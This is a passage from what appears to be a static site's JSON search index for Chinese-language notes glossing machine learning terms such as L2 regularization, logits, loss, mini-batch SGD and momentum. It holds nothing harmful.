loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#124-l_2-l_2-regularization","text":"\u4e00\u79cd \u6b63\u5219\u5316 \uff0c\u6839\u636e\u6743\u91cd\u7684\u5e73\u65b9\u548c\u6765\u60e9\u7f5a\u6743\u91cd\u3002 L_2 \u6b63\u5219\u5316\u6709\u52a9\u4e8e\u4f7f\u79bb\u7fa4\u503c\uff08\u5177\u6709\u8f83\u5927\u6b63\u503c\u6216\u8f83\u5c0f\u8d1f\u503c\uff09\u6743\u91cd\u63a5\u8fd1\u4e8e 0\uff0c\u4f46\u53c8\u4e0d\u6b63\u597d\u4e3a 0\u3002\uff08\u4e0e L1 \u6b63\u5219\u5316 \u76f8\u5bf9\u3002\uff09\u5728\u7ebf\u6027\u6a21\u578b\u4e2d\uff0c L_2 \u6b63\u5219\u5316\u59cb\u7ec8\u53ef\u4ee5\u6539\u8fdb\u6cdb\u5316\u3002","title":"12.4. L_2\u00a0\u6b63\u5219\u5316 (L_2 regularization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#125-label","text":"\u5728\u76d1\u7763\u5f0f\u5b66\u4e60\u4e2d\uff0c\u6807\u7b7e\u6307 \u6837\u672c \u7684\"\u7b54\u6848\"\u6216\"\u7ed3\u679c\"\u90e8\u5206\u3002\u6709\u6807\u7b7e\u6570\u636e\u96c6\u4e2d\u7684\u6bcf\u4e2a\u6837\u672c\u90fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u7279\u5f81\u4ee5\u53ca\u4e00\u4e2a\u6807\u7b7e\u3002\u4f8b\u5982\uff0c\u5728\u623f\u5c4b\u6570\u636e\u96c6\u4e2d\uff0c\u7279\u5f81\u53ef\u80fd\u5305\u62ec\u5367\u5ba4\u6570\u3001\u536b\u751f\u95f4\u6570\u4ee5\u53ca\u623f\u9f84\uff0c\u800c\u6807\u7b7e\u5219\u53ef\u80fd\u662f\u623f\u4ef7\u3002\u5728\u5783\u573e\u90ae\u4ef6\u68c0\u6d4b\u6570\u636e\u96c6\u4e2d\uff0c\u7279\u5f81\u53ef\u80fd\u5305\u62ec\u4e3b\u9898\u884c\u3001\u53d1\u4ef6\u4eba\u4ee5\u53ca\u7535\u5b50\u90ae\u4ef6\u672c\u8eab\uff0c\u800c\u6807\u7b7e\u5219\u53ef\u80fd\u662f\"\u5783\u573e\u90ae\u4ef6\"\u6216\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002","title":"12.5. \u6807\u7b7e (label)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#126-labeled-example","text":"\u5305\u542b \u7279\u5f81 \u548c \u6807\u7b7e \u7684\u6837\u672c\u3002\u5728\u76d1\u7763\u5f0f\u8bad\u7ec3\u4e2d\uff0c\u6a21\u578b\u4ece\u6709\u6807\u7b7e\u6837\u672c\u4e2d\u5b66\u4e60\u89c4\u5f8b\u3002","title":"12.6. \u6709\u6807\u7b7e\u6837\u672c (labeled example)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#127-lambda","text":"\u4e0e \u6b63\u5219\u5316\u7387 \u7684\u542b\u4e49\u76f8\u540c\u3002 \uff08\u591a\u542b\u4e49\u672f\u8bed\uff0c\u6211\u4eec\u5728\u6b64\u5173\u6ce8\u7684\u662f\u8be5\u672f\u8bed\u5728 \u6b63\u5219\u5316 \u4e2d\u7684\u5b9a\u4e49\u3002\uff09","title":"12.7. lambda"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#128-layer","text":"\u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u4e00\u7ec4 \u795e\u7ecf\u5143 \uff0c\u8d1f\u8d23\u5904\u7406\u4e00\u7ec4\u8f93\u5165\u7279\u5f81\uff0c\u6216\u4e00\u7ec4\u795e\u7ecf\u5143\u7684\u8f93\u51fa\u3002 \u6b64\u5916\u8fd8\u6307 TensorFlow \u4e2d\u7684\u62bd\u8c61\u5c42\u3002\u5c42\u662f Python \u51fd\u6570\uff0c\u4ee5 \u5f20\u91cf \u548c\u914d\u7f6e\u9009\u9879\u4f5c\u4e3a\u8f93\u5165\uff0c\u7136\u540e\u751f\u6210\u5176\u4ed6\u5f20\u91cf\u4f5c\u4e3a\u8f93\u51fa\u3002\u5f53\u5fc5\u8981\u7684\u5f20\u91cf\u7ec4\u5408\u8d77\u6765\u540e\uff0c\u7528\u6237\u4fbf\u53ef\u4ee5\u901a\u8fc7 \u6a21\u578b\u51fd\u6570 \u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a Estimator \u3002","title":"12.8. \u5c42 (layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#129-layers-api-tflayers","text":"\u4e00\u79cd TensorFlow API\uff0c\u7528\u4e8e\u4ee5\u5c42\u7ec4\u5408\u7684\u65b9\u5f0f\u6784\u5efa \u6df1\u5ea6 \u795e\u7ecf\u7f51\u7edc\u3002\u901a\u8fc7 Layers API\uff0c\u60a8\u53ef\u4ee5\u6784\u5efa\u4e0d\u540c\u7c7b\u578b\u7684 \u5c42 \uff0c\u4f8b\u5982\uff1a \u901a\u8fc7 tf.layers.Dense \u6784\u5efa \u5168\u8fde\u63a5\u5c42 \u3002 \u901a\u8fc7 tf.layers.Conv2D \u6784\u5efa\u5377\u79ef\u5c42\u3002 \u5728\u7f16\u5199 \u81ea\u5b9a\u4e49 Estimator \u65f6\uff0c\u60a8\u53ef\u4ee5\u7f16\u5199\"\u5c42\"\u5bf9\u8c61\u6765\u5b9a\u4e49\u6240\u6709 \u9690\u85cf\u5c42 \u7684\u7279\u5f81\u3002 Layers API \u9075\u5faa Keras layers API \u89c4\u8303\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9664\u4e86\u524d\u7f00\u4e0d\u540c\u4ee5\u5916\uff0cLayers API \u4e2d\u7684\u6240\u6709\u51fd\u6570\u5747\u4e0e Keras layers API \u4e2d\u7684\u5bf9\u5e94\u51fd\u6570\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u548c\u7b7e\u540d\u3002","title":"12.9. Layers API (tf.layers)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1210-learning-rate","text":"\u5728\u8bad\u7ec3\u6a21\u578b\u65f6\u7528\u4e8e\u68af\u5ea6\u4e0b\u964d\u7684\u4e00\u4e2a\u6807\u91cf\u3002\u5728\u6bcf\u6b21\u8fed\u4ee3\u671f\u95f4\uff0c \u68af\u5ea6\u4e0b\u964d\u6cd5 \u90fd\u4f1a\u5c06\u5b66\u4e60\u901f\u7387\u4e0e\u68af\u5ea6\u76f8\u4e58\u3002\u5f97\u51fa\u7684\u4e58\u79ef\u79f0\u4e3a\u68af\u5ea6\u6b65\u957f\u3002 \u5b66\u4e60\u901f\u7387\u662f\u4e00\u4e2a\u91cd\u8981\u7684 \u8d85\u53c2\u6570 \u3002","title":"12.10. \u5b66\u4e60\u901f\u7387 (learning rate)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1211-least-squares-regression","text":"\u4e00\u79cd\u901a\u8fc7\u6700\u5c0f\u5316 L_2 \u635f\u5931 \u8bad\u7ec3\u51fa\u7684\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u3002","title":"12.11. \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 (least squares regression)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1212-linear-regression","text":"\u4e00\u79cd \u56de\u5f52\u6a21\u578b \uff0c\u901a\u8fc7\u5c06\u8f93\u5165\u7279\u5f81\u8fdb\u884c\u7ebf\u6027\u7ec4\u5408\u8f93\u51fa\u8fde\u7eed\u503c\u3002","title":"12.12. \u7ebf\u6027\u56de\u5f52 (linear regression)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1213-logistic-regression","text":"\u4e00\u79cd\u6a21\u578b\uff0c\u901a\u8fc7\u5c06 S \u578b\u51fd\u6570 \u5e94\u7528\u4e8e\u7ebf\u6027\u9884\u6d4b\uff0c\u751f\u6210\u5206\u7c7b\u95ee\u9898\u4e2d\u6bcf\u4e2a\u53ef\u80fd\u7684\u79bb\u6563\u6807\u7b7e\u503c\u7684\u6982\u7387\u3002\u867d\u7136\u903b\u8f91\u56de\u5f52\u7ecf\u5e38\u7528\u4e8e \u4e8c\u5143\u5206\u7c7b \u95ee\u9898\uff0c\u4f46\u4e5f\u53ef\u7528\u4e8e \u591a\u7c7b\u522b \u5206\u7c7b\u95ee\u9898\uff08\u5176\u53eb\u6cd5\u53d8\u4e3a\u591a\u7c7b\u522b\u903b\u8f91\u56de\u5f52\u6216\u591a\u9879\u56de\u5f52\uff09\u3002","title":"12.13. \u903b\u8f91\u56de\u5f52 (logistic regression)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1214-logits","text":"\u5206\u7c7b\u6a21\u578b\u751f\u6210\u7684\u539f\u59cb\uff08\u975e\u6807\u51c6\u5316\uff09\u9884\u6d4b\u5411\u91cf\uff0c\u901a\u5e38\u4f1a\u4f20\u9012\u7ed9\u6807\u51c6\u5316\u51fd\u6570\u3002\u5982\u679c\u6a21\u578b\u8981\u89e3\u51b3\u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898\uff0c\u5219\u5bf9\u6570\u901a\u5e38\u53d8\u6210 softmax \u51fd\u6570 \u7684\u8f93\u5165\u3002\u4e4b\u540e\uff0csoftmax \u51fd\u6570\u4f1a\u751f\u6210\u4e00\u4e2a\uff08\u6807\u51c6\u5316\uff09\u6982\u7387\u5411\u91cf\uff0c\u5bf9\u5e94\u4e8e\u6bcf\u4e2a\u53ef\u80fd\u7684\u7c7b\u522b\u3002 \u6b64\u5916\uff0c\u5bf9\u6570\u6709\u65f6\u4e5f\u79f0\u4e3a S \u578b\u51fd\u6570 \u7684\u5143\u7d20\u7ea7\u53cd\u51fd\u6570\u3002\u5982\u9700\u4e86\u89e3\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 tf.nn.sigmoid_cross_entropy_with_logits \u3002","title":"12.14. \u5bf9\u6570 (logits)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1215-log-loss","text":"\u4e8c\u5143 \u903b\u8f91\u56de\u5f52 \u4e2d\u4f7f\u7528\u7684 \u635f\u5931 \u51fd\u6570\u3002","title":"12.15. \u5bf9\u6570\u635f\u5931\u51fd\u6570 (Log Loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1216-log-odds","text":"\u67d0\u4e2a\u4e8b\u4ef6\u51e0\u7387\u7684\u5bf9\u6570\u3002 \u5982\u679c\u4e8b\u4ef6\u6d89\u53ca\u4e8c\u5143\u6982\u7387\uff0c\u5219\u51e0\u7387\u6307\u7684\u662f\u6210\u529f\u6982\u7387 (p) \u4e0e\u5931\u8d25\u6982\u7387 (1-p) \u4e4b\u6bd4\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u7ed9\u5b9a\u4e8b\u4ef6\u7684\u6210\u529f\u6982\u7387\u4e3a 90\uff05\uff0c\u5931\u8d25\u6982\u7387\u4e3a 10\uff05\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u51e0\u7387\u7684\u8ba1\u7b97\u516c\u5f0f\u5982\u4e0b\uff1a \\text{\u51e0\u7387} = \\frac{p}{(1- p)} = \\frac{0.9}{0.1} = 9 \u7b80\u5355\u6765\u8bf4\uff0c\u5bf9\u6570\u51e0\u7387\u5373\u51e0\u7387\u7684\u5bf9\u6570\u3002\u6309\u7167\u60ef\u4f8b\uff0c\"\u5bf9\u6570\"\u6307\u81ea\u7136\u5bf9\u6570\uff0c\u4f46\u5bf9\u6570\u7684\u57fa\u6570\u5176\u5b9e\u53ef\u4ee5\u662f\u4efb\u4f55\u5927\u4e8e 1 \u7684\u6570\u3002\u82e5\u9075\u5faa\u60ef\u4f8b\uff0c\u4e0a\u8ff0\u793a\u4f8b\u7684\u5bf9\u6570\u51e0\u7387\u5e94\u4e3a\uff1a \\text{\u5bf9\u6570\u51e0\u7387} = \\ln(9) = 2.2 \u5bf9\u6570\u51e0\u7387\u662f S \u578b\u51fd\u6570 \u7684\u53cd\u51fd\u6570\u3002","title":"12.16. \u5bf9\u6570\u51e0\u7387 (log-odds)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1217-loss","text":"\u4e00\u79cd\u8861\u91cf\u6307\u6807\uff0c\u7528\u4e8e\u8861\u91cf\u6a21\u578b\u7684 \u9884\u6d4b \u504f\u79bb\u5176 \u6807\u7b7e \u7684\u7a0b\u5ea6\u3002\u6216\u8005\u66f4\u60b2\u89c2\u5730\u8bf4\u662f\u8861\u91cf\u6a21\u578b\u6709\u591a\u5dee\u3002\u8981\u786e\u5b9a\u6b64\u503c\uff0c\u6a21\u578b\u5fc5\u987b\u5b9a\u4e49\u635f\u5931\u51fd\u6570\u3002\u4f8b\u5982\uff0c\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u901a\u5e38\u5c06 \u5747\u65b9\u8bef\u5dee \u7528\u4f5c\u635f\u5931\u51fd\u6570\uff0c\u800c\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5219\u4f7f\u7528 \u5bf9\u6570\u635f\u5931\u51fd\u6570 \u3002","title":"12.17. \u635f\u5931 (Loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#13-m","text":"","title":"13. M"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#131-machine-learning","text":"\u4e00\u79cd\u7a0b\u5e8f\u6216\u7cfb\u7edf\uff0c\u7528\u4e8e\u6839\u636e\u8f93\u5165\u6570\u636e\u6784\u5efa\uff08\u8bad\u7ec3\uff09\u9884\u6d4b\u6a21\u578b\u3002\u8fd9\u79cd\u7cfb\u7edf\u4f1a\u5229\u7528\u5b66\u5230\u7684\u6a21\u578b\u6839\u636e\u4ece\u5206\u5e03\uff08\u8bad\u7ec3\u8be5\u6a21\u578b\u65f6\u4f7f\u7528\u7684\u540c\u4e00\u5206\u5e03\uff09\u4e2d\u63d0\u53d6\u7684\u65b0\u6570\u636e\uff08\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u6570\u636e\uff09\u8fdb\u884c\u5b9e\u7528\u7684\u9884\u6d4b\u3002\u673a\u5668\u5b66\u4e60\u8fd8\u6307\u4e0e\u8fd9\u4e9b\u7a0b\u5e8f\u6216\u7cfb\u7edf\u76f8\u5173\u7684\u7814\u7a76\u9886\u57df\u3002","title":"13.1. \u673a\u5668\u5b66\u4e60 (machine learning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#132-mse-mean-squared-error","text":"\u6bcf\u4e2a\u6837\u672c\u7684\u5e73\u5747\u5e73\u65b9\u635f\u5931\u3002MSE \u7684\u8ba1\u7b97\u65b9\u6cd5\u662f \u5e73\u65b9\u635f\u5931 \u9664\u4ee5 \u6837\u672c \u6570\u3002 TensorFlow Playground \u663e\u793a\u7684\"\u8bad\u7ec3\u635f\u5931\"\u503c\u548c\"\u6d4b\u8bd5\u635f\u5931\"\u503c\u90fd\u662f MSE\u3002","title":"13.2. \u5747\u65b9\u8bef\u5dee (MSE, Mean Squared Error)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#133-metric","text":"\u60a8\u5173\u5fc3\u7684\u4e00\u4e2a\u6570\u503c\u3002\u53ef\u80fd\u53ef\u4ee5\u4e5f\u53ef\u80fd\u4e0d\u53ef\u4ee5\u76f4\u63a5\u5728\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u4e2d\u5f97\u5230\u4f18\u5316\u3002\u60a8\u7684\u7cfb\u7edf\u5c1d\u8bd5\u4f18\u5316\u7684\u6307\u6807\u79f0\u4e3a \u76ee\u6807 \u3002","title":"13.3. \u6307\u6807 (metric)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#134-metrics-api-tfmetrics","text":"\u4e00\u79cd\u7528\u4e8e\u8bc4\u4f30\u6a21\u578b\u7684 TensorFlow API\u3002\u4f8b\u5982\uff0c tf.metrics.accuracy \u7528\u4e8e\u786e\u5b9a\u6a21\u578b\u7684\u9884\u6d4b\u4e0e\u6807\u7b7e\u5339\u914d\u7684\u9891\u7387\u3002\u5728\u7f16\u5199 \u81ea\u5b9a\u4e49 Estimator \u65f6\uff0c\u60a8\u53ef\u4ee5\u8c03\u7528 Metrics API \u51fd\u6570\u6765\u6307\u5b9a\u5e94\u5982\u4f55\u8bc4\u4f30\u60a8\u7684\u6a21\u578b\u3002","title":"13.4. Metrics API (tf.metrics)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#135-mini-batch","text":"\u4ece\u6574\u6279 \u6837\u672c \u5185\u968f\u673a\u9009\u62e9\u5e76\u5728\u8bad\u7ec3\u6216\u63a8\u65ad\u8fc7\u7a0b\u7684\u4e00\u6b21\u8fed\u4ee3\u4e2d\u4e00\u8d77\u8fd0\u884c\u7684\u4e00\u5c0f\u90e8\u5206\u6837\u672c\u3002\u5c0f\u6279\u6b21\u7684 \u6279\u6b21\u5927\u5c0f \u901a\u5e38\u4ecb\u4e8e 10 \u5230 1000 \u4e4b\u95f4\u3002\u4e0e\u57fa\u4e8e\u5b8c\u6574\u7684\u8bad\u7ec3\u6570\u636e\u8ba1\u7b97\u635f\u5931\u76f8\u6bd4\uff0c\u57fa\u4e8e\u5c0f\u6279\u6b21\u6570\u636e\u8ba1\u7b97\u635f\u5931\u8981\u9ad8\u6548\u5f97\u591a\u3002","title":"13.5. \u5c0f\u6279\u6b21 (mini-batch)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#136-sgd-mini-batch-stochastic-gradient-descent","text":"\u4e00\u79cd\u91c7\u7528 \u5c0f\u6279\u6b21 \u6837\u672c\u7684 \u68af\u5ea6\u4e0b\u964d\u6cd5 \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c0f\u6279\u6b21 SGD \u4f1a\u6839\u636e\u4e00\u5c0f\u90e8\u5206\u8bad\u7ec3\u6570\u636e\u6765\u4f30\u7b97\u68af\u5ea6\u3002 Vanilla SGD \u4f7f\u7528\u7684\u5c0f\u6279\u6b21\u7684\u5927\u5c0f\u4e3a 1\u3002","title":"13.6. \u5c0f\u6279\u6b21\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, mini-batch stochastic gradient descent)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#137-ml","text":"\u673a\u5668\u5b66\u4e60 \u7684\u7f29\u5199\u3002","title":"13.7. ML"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#138-model","text":"\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u4ece\u8bad\u7ec3\u6570\u636e\u5b66\u5230\u7684\u5185\u5bb9\u7684\u8868\u793a\u5f62\u5f0f\u3002\u591a\u542b\u4e49\u672f\u8bed\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e0b\u5217\u4e24\u79cd\u76f8\u5173\u542b\u4e49\u4e4b\u4e00\uff1a \u4e00\u79cd TensorFlow \u56fe\uff0c\u7528\u4e8e\u8868\u793a\u9884\u6d4b\u7684\u8ba1\u7b97\u7ed3\u6784\u3002 \u8be5 TensorFlow \u56fe\u7684\u7279\u5b9a\u6743\u91cd\u548c\u504f\u5dee\uff0c\u901a\u8fc7 \u8bad\u7ec3 \u51b3\u5b9a\u3002","title":"13.8. \u6a21\u578b (model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#139-model-function","text":"Estimator \u4e2d\u7684\u51fd\u6570\uff0c\u7528\u4e8e\u5b9e\u73b0\u673a\u5668\u5b66\u4e60\u8bad\u7ec3\u3001\u8bc4\u4f30\u548c\u63a8\u65ad\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u51fd\u6570\u7684\u8bad\u7ec3\u90e8\u5206\u53ef\u4ee5\u5904\u7406\u4ee5\u4e0b\u4efb\u52a1\uff1a\u5b9a\u4e49\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u7684\u62d3\u6251\u5e76\u786e\u5b9a\u5176 \u4f18\u5316\u5668 \u51fd\u6570\u3002\u5982\u679c\u4f7f\u7528 \u9884\u521b\u5efa\u7684 Estimator \uff0c\u5219\u6709\u4eba\u5df2\u4e3a\u60a8\u7f16\u5199\u4e86\u6a21\u578b\u51fd\u6570\u3002\u5982\u679c\u4f7f\u7528 \u81ea\u5b9a\u4e49 Estimator \uff0c\u5219\u5fc5\u987b\u81ea\u884c\u7f16\u5199\u6a21\u578b\u51fd\u6570\u3002 \u6709\u5173\u7f16\u5199\u6a21\u578b\u51fd\u6570\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u521b\u5efa\u81ea\u5b9a\u4e49 Estimator \u3002","title":"13.9. \u6a21\u578b\u51fd\u6570 (model function)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1310-model-training","text":"\u786e\u5b9a\u6700\u4f73 \u6a21\u578b \u7684\u8fc7\u7a0b\u3002","title":"13.10. \u6a21\u578b\u8bad\u7ec3 (model training)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1311-momentum","text":"\u4e00\u79cd\u5148\u8fdb\u7684\u68af\u5ea6\u4e0b\u964d\u6cd5\uff0c\u5176\u4e2d\u5b66\u4e60\u6b65\u957f\u4e0d\u4ec5\u53d6\u51b3\u4e8e\u5f53\u524d\u6b65\u957f\u7684\u5bfc\u6570\uff0c\u8fd8\u53d6\u51b3\u4e8e\u4e4b\u524d\u4e00\u6b65\u6216\u591a\u6b65\u7684\u6b65\u957f\u7684\u5bfc\u6570\u3002\u52a8\u91cf\u6d89\u53ca\u8ba1\u7b97\u68af\u5ea6\u968f\u65f6\u95f4\u800c\u53d8\u5316\u7684\u6307\u6570\u7ea7\u52a0\u6743\u79fb\u52a8\u5e73\u5747\u503c\uff0c\u4e0e\u7269\u7406\u5b66\u4e2d\u7684\u52a8\u91cf\u7c7b\u4f3c\u3002\u52a8\u91cf\u6709\u65f6\u53ef\u4ee5\u9632\u6b62\u5b66\u4e60\u8fc7\u7a0b\u88ab\u5361\u5728\u5c40\u90e8\u6700\u5c0f\u7684\u60c5\u51b5\u3002","title":"13.11. \u52a8\u91cf 